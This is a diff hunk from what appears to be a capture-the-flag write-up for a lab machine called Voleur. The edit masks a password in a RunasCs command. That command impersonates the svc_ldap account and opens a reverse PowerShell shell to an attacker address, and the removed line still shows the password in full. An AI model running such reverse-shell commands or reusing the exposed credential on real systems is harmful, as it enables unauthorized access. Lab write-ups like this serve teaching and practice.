@@ -122,7 +122,7 @@ User Impersonation: To leverage the RESTORE_USERS group's permissions, the svc_l
 Bash
 ```
 upload /home/kali/Voleur/RunasCs.exe
-.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.xx.xxx6666
+.\RunasCS.exe svc_ldap M1XyC...qT5Vn powershell.exe -r 10.10.xx.xxx6666
 ```
 This provides a shell as svc_ldap.
 
